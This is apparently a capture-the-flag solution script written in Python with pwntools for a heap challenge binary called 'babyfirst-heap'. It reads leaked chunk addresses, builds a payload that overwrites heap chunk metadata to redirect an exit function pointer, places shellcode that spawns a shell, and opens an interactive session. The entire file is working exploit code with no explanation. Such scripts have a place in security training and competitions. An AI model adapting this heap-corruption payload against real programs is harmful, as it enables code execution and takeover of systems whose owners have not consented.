#!/usr/bin/env python
from pwn import *
import re

if __name__ == '__main__':
    s = process('./babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c')

    context(os = 'linux', arch = 'x86')
    
    s.recvuntil('address.\n')    
    table = []
    for i in range(20):
        m = re.match(r'.*=([0-9A-F]*)].*=([0-9A-F]*)',s.recvline())
        addr = int(m.group(1),16)
        size = int(m.group(2))
        table.append((addr,size))
    
    exit_func = 0x804c8ac

    shellcode = '\xeb\x0b'.ljust(0xd,'A') + asm(shellcraft.sh())

    payload = ''
    payload += 'A' * 8
    payload += shellcode
    payload = payload.ljust(0x104,'A')
    payload += p32(0x81)
    payload += 'A' * 0x7c
    payload += p32(0x81)
    payload += p32(exit_func - 0x8) + p32(table[10][0] + 0x8)
    payload += 'A' * 0x70
    payload += p32(0x80) * 2

    s.sendline(payload)
    s.interactive()
